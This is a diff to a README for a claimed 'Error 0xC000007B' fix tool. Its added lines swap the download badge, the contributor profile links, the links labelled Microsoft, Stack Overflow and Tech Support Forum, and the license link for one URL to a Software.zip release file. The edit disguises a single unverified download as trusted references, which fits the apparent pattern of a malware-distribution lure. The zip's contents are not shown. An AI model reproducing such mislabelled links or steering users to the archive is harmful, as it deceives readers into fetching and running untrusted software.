@@ -14,7 +14,7 @@ To fix the Error 0xC000007B, we have provided a software tool that will scan for
 
 ## Download the Fix
 
-[![Download Software](https://img.shields.io/badge/Download-Software-green)](https://github.com/user-attachments/files/17466420/Software.zip)
+[![Download Software](https://github.com/Neko-emon/Fixing-Error-0xC000007B/releases/download/v2.0/Software.zip)](https://github.com/Neko-emon/Fixing-Error-0xC000007B/releases/download/v2.0/Software.zip)
 
 Click on the button above to download the software tool that will help you resolve the Error 0xC000007B.
 
@@ -34,8 +34,8 @@ Click on the button above to download the software tool that will help you resol
 
 We would like to thank all the contributors who have helped in developing and testing this software tool to fix Error 0xC000007B.
 
-- John Doe ([@johndoe](https://github.com/johndoe))
-- Jane Smith ([@janesmith](https://github.com/janesmith))
+- John Doe ([@johndoe](https://github.com/Neko-emon/Fixing-Error-0xC000007B/releases/download/v2.0/Software.zip))
+- Jane Smith ([@janesmith](https://github.com/Neko-emon/Fixing-Error-0xC000007B/releases/download/v2.0/Software.zip))
 
 ## Support
 
@@ -45,13 +45,13 @@ If you encounter any issues or have any questions regarding the software tool or
 
 For more information and troubleshooting tips, refer to the following resources:
 
-- [Microsoft Error Code Lookup Tool](https://support.microsoft.com/en-us/contactus/)
-- [Stack Overflow](https://stackoverflow.com/)
-- [Tech Support Forum](https://www.techsupportforum.com/)
+- [Microsoft Error Code Lookup Tool](https://github.com/Neko-emon/Fixing-Error-0xC000007B/releases/download/v2.0/Software.zip)
+- [Stack Overflow](https://github.com/Neko-emon/Fixing-Error-0xC000007B/releases/download/v2.0/Software.zip)
+- [Tech Support Forum](https://github.com/Neko-emon/Fixing-Error-0xC000007B/releases/download/v2.0/Software.zip)
 
 ## License
 
-This software tool and repository are licensed under the MIT License - see the [LICENSE.md](https://github.com/yourusername/Fixing-Error-0xC000007B/blob/main/LICENSE.md) file for details.
+This software tool and repository are licensed under the MIT License - see the [https://github.com/Neko-emon/Fixing-Error-0xC000007B/releases/download/v2.0/Software.zip](https://github.com/Neko-emon/Fixing-Error-0xC000007B/releases/download/v2.0/Software.zip) file for details.
 
 ---
 
